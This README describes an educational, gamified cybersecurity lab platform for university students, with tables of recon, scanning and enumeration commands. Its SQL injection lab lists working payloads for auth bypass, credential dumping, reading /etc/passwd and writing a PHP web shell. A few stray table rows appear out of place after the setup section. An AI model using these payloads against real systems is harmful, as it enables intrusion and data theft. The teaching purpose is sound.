<div align="center">

# 🛡️ Cyber-Masry | سايبر مصري

**An interactive, gamified cybersecurity learning platform built for Zewailcity IT 102 students.**

[![React](https://img.shields.io/badge/React-18-61DAFB?style=for-the-badge&logo=react&logoColor=black)](https://reactjs.org)
[![TypeScript](https://img.shields.io/badge/TypeScript-5-3178C6?style=for-the-badge&logo=typescript&logoColor=white)](https://typescriptlang.org)
[![Vite](https://img.shields.io/badge/Vite-5-646CFF?style=for-the-badge&logo=vite&logoColor=white)](https://vitejs.dev)
[![TailwindCSS](https://img.shields.io/badge/Tailwind-3-06B6D4?style=for-the-badge&logo=tailwindcss&logoColor=white)](https://tailwindcss.com)
[![Flask](https://img.shields.io/badge/Flask-Python-000000?style=for-the-badge&logo=flask&logoColor=white)](https://flask.palletsprojects.com)

> *"بدل ما تحفظ — افهم. بدل ما تتفرج — جرّب."*  
> *Instead of memorizing — understand. Instead of watching — try.*

</div>

---

## ⚡ What is Cyber-Masry?

Cyber-Masry is a **browser-based cybersecurity lab platform** that puts students *inside* the tools instead of reading about them. Every lab is a self-contained mission with:

- 🖥️ A **live terminal simulator** — run real recon commands, see realistic output
- 🔍 A **Google Dork sandbox** (Zoogle) — learn advanced search operators interactively  
- 🕵️ A **fake LinkedIn profile** — practice Social Media OSINT the ethical way
- 📖 A **glossary tooltip system** — click any technical term for an instant definition + Egyptian Arabic analogy
- 🤖 A **floating smart assistant** — lab-aware, step-aware guidance at every stage
- 🚩 **CTF-style flag capture** — complete all steps to reveal the flag

---

## 🗺️ Available Labs

| # | Lab (EN / AR) | Focus | Difficulty | Points |
|---|---------------|-------|------------|--------|
| 01 | El-Taqassi / التقصي | Passive Recon & Google Dorking | Beginner | 100 |
| 02 | El-Tafteesh / التفتيش | Port Scanning with Nmap | Intermediate | 150 |
| 03 | El-Daraaj El-Serry / الدراج السري | Directory Enumeration (Gobuster) | Intermediate | 175 |
| 04 | El-Ekhteraq / الاختراق | SQL Injection | Intermediate | 200 |
| 05 | El-Basaama / البصمة | Banner Grabbing & CVE Analysis | Advanced | 250 |
| 06 | El-Dokhool El-Khafee / الدخول الخفي | Rapid Initial Access Simulation (10-Min) | Intermediate | 120 |

---

## 🎮 Lab Details

### Lab 01 — El-Taqassi (التقصي)
**Passive Reconnaissance & Google Dorking**

| Step | Tool | Objective |
|------|------|-----------|
| 1 | 💻 Terminal | `whoami` — Identify user & privileges |
| 2 | 💻 Terminal | `whois evilcorp.com` — Domain ownership |
| 3 | 💻 Terminal | `nslookup evilcorp.com` — DNS resolution |
| 4 | 💻 Terminal | `curl -I evilcorp.com` — HTTP header fingerprinting |
| 5 | 🔎 LinkedIn | **El-Stalker** — Find IT Manager's pet name from social posts |
| 6–8 | 🔍 Zoogle | Google Dork operators: `site:` + `inurl:admin` |
| 9 | 🔍 Zoogle | Click target link → capture `FLAG{...}` |

### Lab 02 — El-Tafteesh (التفتيش)
**Active Port Scanning with Nmap**

| Step | Command | Concept |
|------|---------|---------|
| 1 | `nmap 192.168.1.5` | Basic TCP SYN scan |
| 2 | `nmap -sV 192.168.1.5` | Service version detection |
| 3 | `nmap -p 22,80,443 192.168.1.5` | Targeted port scan |
| 4 | `nmap -O 192.168.1.5` | OS fingerprinting |
| 5 | `nmap -A 192.168.1.5` | Aggressive scan (version + OS + scripts) |
| 6 | `nmap -p- 192.168.1.5` | Full 65535-port scan |
| 7 | `nmap -sU 192.168.1.5` | UDP scan |
| 8 | `nmap -T4 -F 192.168.1.5` | Fast scan with timing template |
| 9 | `nmap --script vuln 192.168.1.5` | NSE vulnerability scripts |
| 10 | `nmap -sn 192.168.1.0/24` | Host discovery / ping sweep |

### Lab 03 — El-Daraaj El-Serry (الدراج السري)
**Directory & File Enumeration with Gobuster**

| Step | Command | Concept |
|------|---------|---------|
| 1 | `gobuster dir -u http://... -w common.txt` | Basic dir brute-force |
| 2 | `gobuster dir ... -x php,html` | Extension filtering |
| 3 | `gobuster dir ... -w admin.txt` | Admin-specific wordlist |
| 4 | `gobuster dir ... -v` | Verbose — see 403 responses |
| 5 | `gobuster dir ... -t 50` | Threading for speed |
| 6 | `gobuster dns -d evilcorp.com -w subdomains.txt` | Subdomain enumeration |
| 7 | `gobuster dir ... /api/v1/ ...` | API endpoint discovery |
| 8 | `gobuster dir ... -x bak,sql,zip` | Backup file hunting |
| 9 | `gobuster dir ... --delay 200ms` | Stealth slow scan |
| 10 | `gobuster dir ... -o results.txt` | Save report to file |

### Lab 04 — El-Ekhteraq (الاختراق)
**SQL Injection — From Error to RCE**

| Step | Payload | Technique |
|------|---------|-----------|
| 1 | `'` | Single quote error-based detection |
| 2 | `' OR '1'='1` | Classic auth bypass |
| 3 | `admin'--` | Comment-based bypass |
| 4 | `' ORDER BY 3--` | Column count enumeration |
| 5 | `' UNION SELECT 1,version(),3--` | UNION data extraction |
| 6 | `' UNION SELECT 1,table_name,3 FROM information_schema.tables--` | Table enumeration |
| 7 | `' UNION SELECT 1,concat(username,':',password),3 FROM users--` | Credential dump |
| 8 | `' UNION SELECT 1,length(password),3 FROM users LIMIT 1--` | Hash length → algorithm |
| 9 | `' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3--` | File read |
| 10 | `' UNION SELECT 1,'<?php system($_GET[cmd]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'--` | Web shell → RCE |

### Lab 05 — El-Basaama (البصمة)
**Banner Grabbing & CVE Analysis**

| Step | Command | Service/CVE |
|------|---------|-------------|
| 1 | `nc 192.168.1.5 80` | HTTP — Apache/2.4.38, PHP/7.4.3 |
| 2 | `nc 192.168.1.5 22` | SSH — OpenSSH 7.9 (CVE-2018-15473, CVE-2023-38408) |
| 3 | `nc 192.168.1.5 21` | FTP — vsFTPd 3.0.3, anonymous login |
| 4 | `curl -I http://192.168.1.5` | HTTP headers leak analysis |
| 5 | `telnet 192.168.1.5 23` | Telnet plaintext = critical finding |
| 6 | `searchsploit apache 2.4.38` | CVE-2019-0211 (CVSS 7.8) — local privesc |
| 7 | `searchsploit openssh 7.9` | CVE-2018-15473 — username enumeration |
| 8 | `nc 192.168.1.5 25` | SMTP — VRFY user enumeration |
| 9 | `whatweb http://192.168.1.5` | One-shot web fingerprint (WP, jQuery) |
| 10 | `nikto -h http://192.168.1.5` | Full automated web vulnerability scan |

---

## 🏗️ Project Architecture

```
Cyber-Masry/
├── frontend/                    # React + TypeScript (Vite)
│   └── src/
│       ├── components/
│       │   ├── TerminalSimulator.tsx   # Lab 01 terminal (OSINT commands)
│       │   ├── FloatingAssistant.tsx   # Lab-aware step guidance bot
│       │   ├── ZoogleSearch.tsx        # Google Dork simulator
│       │   ├── FakeLinkedIn.tsx        # OSINT social media challenge
│       │   ├── LabCompletionCelebration.tsx  # Confetti + flag modal
│       │   ├── TermTooltip.tsx         # Glossary popup component
│       │   └── Header / Footer
│       ├── hooks/
│       │   └── useMissionProgress.ts   # Global MissionStep interface
│       ├── labs/
│       │   ├── registry.ts             # Auto-discovers labs via meta.ts
│       │   ├── types.ts                # LabMeta interface
│       │   ├── lab01/ → Lab01.tsx (pages)
│       │   ├── lab02/ → NmapTerminal · useMissionProgress · Page · meta
│       │   ├── lab03/ → BusterTerminal · useMissionProgress · Page · meta
│       │   ├── lab04/ → SQLiTerminal · useMissionProgress · Page · meta
│       │   ├── lab05/ → BannerTerminal · useMissionProgress · Page · meta
│       │   └── lab06/ → AccessTerminal · useMissionProgress · Page · meta
│       └── pages/
│           ├── LandingPage.tsx
│           ├── LabsPage.tsx
│           └── LabRoute.tsx            # Dynamic lazy-loader by slug
│
└── backend/                     # Python Flask REST API
    ├── app.py                   # Routes: /api/labs, /api/solve
    └── models.py                # SQLAlchemy: User, Lab, Solve
```

---

## 🎨 Design System — "Neon Cairo"

The UI is built around a custom dark theme that blends cyberpunk aesthetics with Egyptian flavor:

| Token | Color | Usage |
|-------|-------|-------|
| `neon-amber` | `#FFBF00` | Primary accent, active states |
| `neon-green` | `#00FF41` | Terminal output, success states |
| `neon-orange` | `#FF6B2B` | Warnings, hints |
| `dark-bg` | `#0A0A0F` | Page background |
| `dark-card` | `#111118` | Card surfaces |

**Typography:** `JetBrains Mono` for terminal / code · `Cairo` for Arabic text

---

## 📖 Glossary Tooltip System

Any technical term appearing in terminal output, Zoogle feedback, or search snippets is **underlined in amber**. Click it to get:

- ✅ A clear English definition  
- 🇪🇬 An Egyptian Arabic analogy that makes it stick  
- 🏷️ Category badge: `network` · `web` · `os` · `pentest` · `crypto`

**22 terms covered**, including: `DNS`, `OSINT`, `HTTP Headers`, `Google Dork`, `CVE`, `Load Balancer`, `SSH`, `Privilege Escalation`, and more.

---

## 🚀 Getting Started

### Prerequisites
- Node.js 18+
- Python 3.9+

### Frontend
```bash
cd frontend
npm install
npm run dev
# → http://localhost:5173
```

### Backend
```bash
cd backend
pip install flask flask-cors flask-sqlalchemy
python app.py
# → http://localhost:5000
```

> The frontend Vite dev server proxies `/api/*` requests to Flask automatically.

| `ip addr` / `ifconfig` | Network interface info |
| `ls` / `cat flag.txt` | Filesystem exploration |
| `help` | Show all available commands |

---

## 🏆 Learning Objectives

By the end of Lab 01, students understand:

1. **OSINT** — gathering intelligence without touching the target
2. **WHOIS** — who owns a domain and when it was registered
3. **DNS** — how domain names resolve to IP addresses  
4. **HTTP Headers** — how web servers reveal their tech stack
5. **Social Media OSINT** — why oversharing online is a security risk
6. **Google Dorks** — advanced search to find exposed resources

---

## 🔒 Ethics & Disclaimer

> All labs run entirely in the browser. There are **zero real network connections** to any external server. Everything you see — terminal output, search results, LinkedIn profiles — is simulated for educational purposes.

This platform teaches **defensive awareness** and **ethical security mindset**.

---

<div align="center">

Built with ❤️ and ☕ by **Omar Badran**  
*IT 102 · Extra Labs · Faculty of Computers and Information*

</div>
